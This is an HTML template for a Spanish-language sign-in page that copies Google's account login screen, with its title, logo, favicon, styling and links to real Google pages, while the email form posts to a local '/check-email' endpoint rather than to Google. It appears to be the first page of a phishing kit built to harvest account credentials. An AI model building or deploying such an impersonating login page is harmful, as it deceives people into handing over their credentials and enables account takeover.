<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Iniciar sesión - Cuenta de Google</title>
    <link rel="icon" href="https://www.google.com/favicon.ico" type="image/x-icon">
    <style>
        body{font-family:'Roboto',arial,sans-serif;font-size:14px;color:#202124;margin:0;padding:0;background:#fff;height:100vh;display:flex;flex-direction:column;align-items:center;}
        .header{padding:20px;width:100%;text-align:right;}
        .header a{color:#5f6368;text-decoration:none;margin-left:16px;font-size:13px;}
        .header a:hover{text-decoration:underline;}
        .logo{margin-top:40px;margin-bottom:20px;}
        .logo img{width:75px;height:24px;}
        .container{width:100%;max-width:450px;border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px;margin:0 auto;}
        .title{font-size:24px;font-weight:400;line-height:1.3333;text-align:center;margin-bottom:8px;}
        .subtitle{font-size:16px;font-weight:400;letter-spacing:0.1px;line-height:1.5;text-align:center;color:#5f6368;margin-bottom:36px;}
        .input-container{margin-bottom:24px;}
        .google-input{width:100%;padding:13px 15px;font-size:16px;border:1px solid #dadce0;border-radius:4px;box-sizing:border-box;}
        .google-input:focus{outline:none;border:2px solid #1a73e8;padding:12px 14px;}
        .error-message{color:#d93025;font-size:14px;margin-bottom:20px;background:#fce8e6;padding:12px;border-radius:4px;}
        .forgot-email{display:block;color:#1a73e8;font-weight:500;text-decoration:none;font-size:14px;margin-bottom:48px;}
        .forgot-email:hover{text-decoration:underline;}
        .info-text{color:#5f6368;font-size:14px;line-height:1.4286;margin-bottom:32px;}
        .info-text a{color:#1a73e8;text-decoration:none;font-weight:500;}
        .info-text a:hover{text-decoration:underline;}
        .button-group{display:flex;justify-content:space-between;align-items:center;}
        .create-account{color:#1a73e8;font-weight:500;text-decoration:none;padding:10px 8px;border-radius:4px;}
        .create-account:hover{background:#f6fafe;}
        .next-button{background:#1a73e8;color:#fff;border:none;padding:10px 24px;font-size:14px;font-weight:500;border-radius:4px;cursor:pointer;min-width:88px;}
        .next-button:hover{background:#0d62d9;}
        .footer{margin-top:24px;color:#5f6368;font-size:12px;text-align:center;}
        .footer select{border:1px solid #dadce0;border-radius:4px;padding:6px 10px;color:#5f6368;background:#fff;margin:0 4px;}
        @media (max-width:480px){.container{border:none;padding:24px;}}
    </style>
</head>
<body>
    <div class="header">
        <a href="https://accounts.google.com/signup/v2/createaccount">Crear cuenta</a>
        <a href="https://www.google.com/intl/es/gmail/about/">Gmail</a>
        <a href="https://www.google.com/imghp">Imágenes</a>
    </div>
    
    <div class="logo">
        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_75x24dp.png" alt="Google">
    </div>
    
    <div class="container">
        <div class="title">Iniciar sesión</div>
        <div class="subtitle">Utiliza tu cuenta de Google</div>
        
        <form action="/check-email" method="post">
            <div class="input-container">
                <input type="email" class="google-input" name="email" placeholder="Correo electrónico o teléfono" required autofocus>
            </div>
            
            {% if error_message %}
            <div class="error-message">{{ error_message }}</div>
            {% endif %}
            
            <a href="https://accounts.google.com/signin/recovery" class="forgot-email" target="_blank">¿Has olvidado tu correo electrónico?</a>
            
            <div class="info-text">
                ¿No es tu ordenador? Usa el modo de invitado para iniciar sesión de forma privada.
                <a href="https://support.google.com/chrome/answer/6130773" target="_blank">Más información</a>
            </div>
            
            <div class="button-group">
                <a href="https://accounts.google.com/signup/v2/createaccount" class="create-account" target="_blank">Crear cuenta</a>
                <button type="submit" class="next-button">Siguiente</button>
            </div>
        </form>
    </div>
    
    <div class="footer">
        <select>
            <option>Español (España)</option>
            <option>English (United States)</option>
            <option>Català</option>
        </select>
    </div>
</body>
</html>
